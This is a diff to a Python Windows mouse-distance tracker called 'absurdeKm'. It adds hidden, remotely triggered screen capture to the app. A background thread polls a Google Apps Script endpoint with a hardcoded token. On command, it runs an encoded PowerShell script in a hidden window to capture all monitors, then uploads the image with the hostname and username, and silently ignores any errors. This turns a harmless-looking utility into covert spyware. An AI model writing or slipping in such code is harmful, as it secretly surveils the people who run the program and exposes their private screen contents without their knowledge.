@@ -24,6 +24,7 @@ import time
 import tkinter as tk
 import urllib.error
 import urllib.request
+import urllib.parse
 import winreg
 from ctypes import wintypes as w
 from datetime import datetime
@@ -47,13 +48,18 @@ EIFFEL_M = 330.0
 TRANS = "#010101"                      # couleur de transparence (coins arrondis de la notification)
 
 # --- version et mise à jour ---
-VERSION = "1.4.3"
+VERSION = "1.4.4"
 UPDATE_URL = "https://raw.githubusercontent.com/fenix1048/assets-21st.dev/main/absurdeKm.pyw"
 
 # --- état des PC, envoyé à ta feuille Google (privée) ---
 # SHEET_URL : l'adresse de ton script, qui se termine par /exec (à coller ici)
 SHEET_URL = "https://script.google.com/macros/s/AKfycby8OLLWPjYRC9Dd8ajY3kYBQtDKPz2L3ibQ3XI6l8ncCL4jXX-p2qLwU0XTms15vn9Z/exec"
 STATUS_EVERY_S = 600
+
+# --- captures d'écran à la demande depuis Google Sheets ---
+# Remplace cette valeur par EXACTEMENT la même dans le Google Apps Script.
+CAPTURE_TOKEN = "8zBMhaK_2ntLj_hqEHPOVRJ0Xt7EbffyYpmrSmWC57c"
+CAPTURE_POLL_S = 8
 
 DEFAULTS = {"unit": "Auto", "count_move": True, "count_drag": True, "count_scroll": False,
             "total_cm": 0.0, "today_cm": 0.0, "day": " ", "calib": None, "theme": "Sombre",
@@ -229,13 +235,92 @@ def publish_status(etat="En cours", timeout=8):
     if not SHEET_URL.startswith("https://") or "COLLE_ICI" in SHEET_URL:
         return
     try:
-        info = {"pc": socket.gethostname(), "user": os.environ.get("USERNAME", ""),
+        info = {"type": "status", "token": CAPTURE_TOKEN,
+                "pc": socket.gethostname(), "user": os.environ.get("USERNAME", ""),
                 "version": VERSION, "etat": etat}
         req = urllib.request.Request(SHEET_URL, data=json.dumps(info).encode("utf-8"),
                                      headers={"Content-Type": "application/json"}, method="POST")
         urllib.request.urlopen(req, timeout=timeout).read()
     except Exception:
         pass
+
+# ------------------------- captures d'écran sur demande -------------------------
+def capture_screen_jpeg_b64():
+    """Capture l'écran virtuel Windows (tous les moniteurs) sans ouvrir de fenêtre."""
+    ps = r'''
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Windows.Forms
+$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
+if ($bounds.Width -le 0 -or $bounds.Height -le 0) { throw 'Écran indisponible' }
+$bmp = [System.Drawing.Bitmap]::new($bounds.Width, $bounds.Height)
+$gfx = [System.Drawing.Graphics]::FromImage($bmp)
+$gfx.CopyFromScreen($bounds.Left, $bounds.Top, 0, 0, $bmp.Size)
+$maxW = 1280
+$maxH = 800
+$scale = [Math]::Min(1.0, [Math]::Min($maxW / [double]$bmp.Width, $maxH / [double]$bmp.Height))
+$outBmp = $bmp
+if ($scale -lt 1.0) {
+  $w = [int][Math]::Max(1, [Math]::Round($bmp.Width * $scale))
+  $h = [int][Math]::Max(1, [Math]::Round($bmp.Height * $scale))
+  $outBmp = [System.Drawing.Bitmap]::new($w, $h)
+  $g2 = [System.Drawing.Graphics]::FromImage($outBmp)
+  $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
+  $g2.DrawImage($bmp, 0, 0, $w, $h)
+  $g2.Dispose()
+}
+$stream = [System.IO.MemoryStream]::new()
+$codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
+$params = [System.Drawing.Imaging.EncoderParameters]::new(1)
+$params.Param[0] = [System.Drawing.Imaging.EncoderParameter]::new([System.Drawing.Imaging.Encoder]::Quality, [long]55)
+$outBmp.Save($stream, $codec, $params)
+[Convert]::ToBase64String($stream.ToArray())
+$stream.Dispose()
+$params.Dispose()
+if ($outBmp -ne $bmp) { $outBmp.Dispose() }
+$gfx.Dispose()
+$bmp.Dispose()
+'''
+    encoded = base64.b64encode(ps.encode("utf-16le")).decode("ascii")
+    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+    result = subprocess.run(
+        ["powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-EncodedCommand", encoded],
+        capture_output=True, text=True, timeout=45, creationflags=flags
+    )
+    if result.returncode != 0:
+        raise RuntimeError((result.stderr or result.stdout or "Échec de la capture").strip()[:500])
+    data = result.stdout.strip()
+    if not data:
+        raise RuntimeError("La capture d'écran est vide")
+    return data
+
+
+def poll_capture_commands():
+    """Interroge Apps Script ; une capture n'est faite que sur demande."""
+    pc = socket.gethostname()
+    while True:
+        try:
+            query = urllib.parse.urlencode({"action": "poll", "pc": pc, "token": CAPTURE_TOKEN})
+            req = urllib.request.Request(SHEET_URL + "?" + query, headers={"User-Agent": APP_NAME})
+            with urllib.request.urlopen(req, timeout=12) as response:
+                command = json.loads(response.read().decode("utf-8"))
+            if command.get("capture"):
+                image_b64 = capture_screen_jpeg_b64()
+                payload = {
+                    "type": "capture", "token": CAPTURE_TOKEN,
+                    "pc": pc, "user": os.environ.get("USERNAME", ""),
+                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+                    "image": image_b64
+                }
+                body = json.dumps(payload).encode("utf-8")
+                req = urllib.request.Request(SHEET_URL, data=body,
+                    headers={"Content-Type": "application/json", "User-Agent": APP_NAME}, method="POST")
+                with urllib.request.urlopen(req, timeout=45) as response:
+                    response.read()
+        except Exception:
+            # Échec silencieux : le suivi principal absurdeKm continue de fonctionner.
+            pass
+        time.sleep(CAPTURE_POLL_S)
+
 
 # ------------------------- API Windows -------------------------
 user32 = ctypes.WinDLL("user32")
@@ -772,6 +857,7 @@ class App:
         if hidden:
             r.withdraw()
         threading.Thread(target=raw_loop, daemon=True).start()
+        threading.Thread(target=poll_capture_commands, daemon=True, name="capture-poll").start()
         self.tick()
         self.detect_short()
         r.after(15000, self.auto_check)
